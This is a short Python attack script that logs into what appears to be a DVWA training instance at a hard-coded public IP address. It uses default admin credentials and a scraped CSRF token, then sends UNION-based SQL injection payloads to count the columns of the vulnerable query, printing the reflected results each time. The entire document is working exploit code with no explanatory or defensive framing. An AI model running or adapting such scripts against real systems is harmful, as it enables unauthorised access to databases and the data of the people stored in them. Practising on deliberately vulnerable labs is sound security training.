
import requests
import re
import html

target_url = "http://31.97.117.123"
session = requests.Session()

# Login first
print("[*] Logging in...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)

# Test 1 column
print("\n[*] Testing 1 column...")
params = {"id": "999 UNION SELECT 1", "Submit": "Submit"}
response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)

# Find and print the pre section
if '<pre>' in response.text:
    start = response.text.find('<pre>')
    end = response.text.find('</pre>', start)
    pre_section = response.text[start+5:end]
    print("Full pre section:")
    print(repr(pre_section))
    print("\nDecoded:")
    print(pre_section)

# Test 2 columns
print("\n\n[*] Testing 2 columns...")
params = {"id": "999 UNION SELECT 1,2", "Submit": "Submit"}
response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)

if '<pre>' in response.text:
    start = response.text.find('<pre>')
    end = response.text.find('</pre>', start)
    pre_section = response.text[start+5:end]
    print("Full pre section:")
    print(repr(pre_section))
    print("\nDecoded:")
    print(pre_section)

# Test 3 columns
print("\n\n[*] Testing 3 columns...")
params = {"id": "999 UNION SELECT 1,2,3", "Submit": "Submit"}
response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)

if '<pre>' in response.text:
    start = response.text.find('<pre>')
    end = response.text.find('</pre>', start)
    pre_section = response.text[start+5:end]
    print("Full pre section:")
    print(repr(pre_section))
    print("\nDecoded:")
    print(pre_section)

